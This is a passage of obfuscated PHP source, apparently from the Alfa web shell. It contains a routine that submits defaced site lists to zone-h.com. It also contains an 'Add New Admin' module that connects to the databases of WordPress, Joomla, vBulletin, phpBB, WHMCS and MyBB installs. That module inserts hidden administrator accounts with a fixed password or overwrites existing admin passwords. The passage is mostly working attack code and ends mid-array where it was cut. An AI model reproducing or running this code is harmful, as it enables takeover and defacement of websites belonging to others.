}elseif($letbcgpfe92d7ff86f8dc5f743fb4c025e68e5aa == "------------------------------------SELECT-------------------------------------"){
die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST SELECT THE REASON [+]</b></font></center>");
}elseif(empty($svjurwzc98defd6ee70dfb1dea416cecdf391f58)){
die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST INTER THE SITES LIST [+]<font></b></center>");
}
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 0;
$vrmbgrekd27edbd18c3bdf9ce1d013c6626ba26c = explode("\n", $svjurwzc98defd6ee70dfb1dea416cecdf391f58);
$rpatbarj56aed7e7485ff03d5605b885b86e947e = new AlfaCURL();
while($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < count($vrmbgrekd27edbd18c3bdf9ce1d013c6626ba26c)){
if(substr($vrmbgrekd27edbd18c3bdf9ce1d013c6626ba26c[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741], 0, 4) != "http"){
$vrmbgrekd27edbd18c3bdf9ce1d013c6626ba26c[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] = "http://".$vrmbgrekd27edbd18c3bdf9ce1d013c6626ba26c[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741];
}
$rpatbarj56aed7e7485ff03d5605b885b86e947e->Send("http://www.zone-h.com/notify/single","post","defacer=".$tnzvgqtvd6a6bc0db10694a2d90e3a69648f3a03."&domain1=". $vrmbgrekd27edbd18c3bdf9ce1d013c6626ba26c[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]."&hackmode=".$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce."&reason=".$letbcgpfe92d7ff86f8dc5f743fb4c025e68e5aa);
++$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741;
}
echo __pre()."<center><font color =\"#00A220\"><b>[+] Sending Sites To Zone-H Has Been Completed Successfully !!![+]</b><font></center>";
}
echo "</div>";
alfafooter();
}
function alfapwchanger(){
alfahead();

echo '<div class=header><center><br><div class="txtfont_header">| Add New Admin |</div>
<center><h3>';
$zedzftuyb2021c4149dfd5dc85c88823b7df34bd = array('WordPress' => array('wp',2),'Joomla' => array('joomla',3),'vBulletin' => array('vb',5),'phpBB' => array('phpbb',6),'WHMCS' => array('whmcs',7),'MyBB' => array('mybb',8),'Php Nuke' => array('nuke',9),'Drupal' => array('drupal',10),'SMF' => array('smf',11));
Alfa_Create_A_Tag('pwchanger',$zedzftuyb2021c4149dfd5dc85c88823b7df34bd);
echo '</h3></center>';
if(isset($_POST['alfa1'])&&$_POST['alfa1']=='wp'){

echo __pre().'<center><center><div class="txtfont_header">| WordPress |</div>
<p>'.getConfigHtml('wp').'</p><form onSubmit="g(\'pwchanger\',null,\'wp\',\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host','id'=>'db_host', 'inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'wp_', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo '<p><input value=" " name="send" type="submit"></p></form>';
if ($_POST['alfa2'] && $_POST['alfa2'] == '>>'){
$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa3'];
$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa4'];
$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa5'];
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa6'];
$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa10'];
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users (ID,user_login,user_pass,user_email) values(null,'$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','d4a590caacc0be55ef286e40a945ea45','$vdhryjes9778840a0100cb30c982876741b0b5a2')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select ID from ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users where user_login='".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$nuabiabibeb7f7a395dc21ad97425bbc061afbaf = @mysqli_num_rows($syosrpmxd4a590caacc0be55ef286e40a945ea45);
if ($nuabiabibeb7f7a395dc21ad97425bbc061afbaf == 1){
$aqewfoiib3cd6a16f46d7fa04280495810dee6d7 = @mysqli_fetch_assoc($syosrpmxd4a590caacc0be55ef286e40a945ea45);
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $aqewfoiib3cd6a16f46d7fa04280495810dee6d7['ID'];
}
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','first_name','solevisible'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','last_name','solevisible'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','nickname','solevisible'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','description','solevisible'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','rich_editing','true'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','comment_shortcuts','false'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','admin_color','fresh'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','use_ssl','0'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','show_admin_bar_front','true'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."user_level','10'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','show_welcome_panel','1'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
}
}
if($_POST['alfa2'] && $_POST['alfa2'] == 'joomla'){

echo __pre().'<center><center><div class="txtfont_header">| Joomla |</div><p><p>'.getConfigHtml('joomla').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',\'joomla\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'jos_', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa3'];
$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa4'];
$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa5'];
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa6'];
$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa10'];
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users (id,name,username,email,password) values(null,'Super User','".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."','".$vdhryjes9778840a0100cb30c982876741b0b5a2."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select id from ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users where username='".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$nuabiabibeb7f7a395dc21ad97425bbc061afbaf =@mysqli_num_rows($syosrpmxd4a590caacc0be55ef286e40a945ea45);
if ($nuabiabibeb7f7a395dc21ad97425bbc061afbaf == 1){
$aqewfoiib3cd6a16f46d7fa04280495810dee6d7 =@mysqli_fetch_assoc($syosrpmxd4a590caacc0be55ef286e40a945ea45);
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $aqewfoiib3cd6a16f46d7fa04280495810dee6d7['id'];
}
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"INSERT INTO ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."user_usergroup_map (user_id,group_id) VALUES ('".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."', '8')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
}
}
if($_POST['alfa4'] && $_POST['alfa4'] == 'vb'){

echo __pre().'<center><center><div class="txtfont_header">| vBulletin |<div><p>'.getConfigHtml('vb').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,\'vb\',this.username.value,this.password.value,this.prefix.value,this.admin.value,this.email.value); return false;" method="POST">';
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa3'];
$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa5'];
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa6'];
$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa7'];
$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_connect_error());
$ummfyfnoc94f162c0101bf9b7a77c539f3f0a655 = @mysqli_connect("SELECT column_name FROM information_schema.columns where table_name = '{$unkkdhum851f5ac9941d720844d143ed9cfcf60a}user' and column_name = 'password' and table_schema = '{$tcmsiznr11e0eed8d3696c0a632f822df385ab3c}'");
$ummfyfnoc94f162c0101bf9b7a77c539f3f0a655 = @mysqli_num_rows($ummfyfnoc94f162c0101bf9b7a77c539f3f0a655);
$vqeznvdx7d2820625fde4543783ade2560bf84eb = "16744444";
if($ummfyfnoc94f162c0101bf9b7a77c539f3f0a655 > 0){
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$vdhryjes9778840a0100cb30c982876741b0b5a2','".date('Y-m-d')."','".time()."')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
}else{
$vqeznvdx7d2820625fde4543783ade2560bf84eb = "2143256444";
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$vdhryjes9778840a0100cb30c982876741b0b5a2','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
}
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select userid from {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}user where username='".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$nuabiabibeb7f7a395dc21ad97425bbc061afbaf = mysqli_num_rows($syosrpmxd4a590caacc0be55ef286e40a945ea45);
if($nuabiabibeb7f7a395dc21ad97425bbc061afbaf == 1){
$aqewfoiib3cd6a16f46d7fa04280495810dee6d7 = mysqli_fetch_assoc($syosrpmxd4a590caacc0be55ef286e40a945ea45);
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $aqewfoiib3cd6a16f46d7fa04280495810dee6d7['userid'];
}
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}administrator (userid,adminpermissions) values('".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','".$vqeznvdx7d2820625fde4543783ade2560bf84eb."')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
}
}
if(isset($_POST['alfa5']) && $_POST['alfa5'] == 'phpbb'){

echo __pre().'<center><div class="txtfont_header">| phpBB |</div><p><p>'.getConfigHtml('phpbb').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,\'phpbb\',this.password.value,null,this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">';
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa3'];
$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa4'];
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa6'];
$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa10'];
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$horyspio0800fc577294c34e0b28ad2839435945 = md5('solevisible');
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users SET username_clean ='".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."' WHERE username_clean = 'admin'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users SET user_password ='".$horyspio0800fc577294c34e0b28ad2839435945."' WHERE username_clean = 'admin'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users SET username_clean ='".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."' WHERE user_type = 3") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users SET user_password ='".$horyspio0800fc577294c34e0b28ad2839435945."' WHERE user_type = 3") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users SET user_email ='".$vdhryjes9778840a0100cb30c982876741b0b5a2."' WHERE username_clean = 'admin'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');
}
}
}
if(isset($_POST['alfa6']) && $_POST['alfa6'] == 'whmcs'){

echo __pre().'<center><div class="txtfont_header">| Whmcs |</div><p><p>'.getConfigHtml('whmcs').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,\'whmcs\',null,this.admin.value,this.email.value); return false;" method="POST">';
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa3'];
$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa4'];
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa5'];
$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."','d4a590caacc0be55ef286e40a945ea45','".$vdhryjes9778840a0100cb30c982876741b0b5a2."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
}
}
if(isset($_POST['alfa7']) && $_POST['alfa7'] == 'mybb'){

echo __pre().'<center><div class="txtfont_header">| Mybb |</div><p><p>'.getConfigHtml('mybb').'</p><form onsubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,\'mybb\',this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">';
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
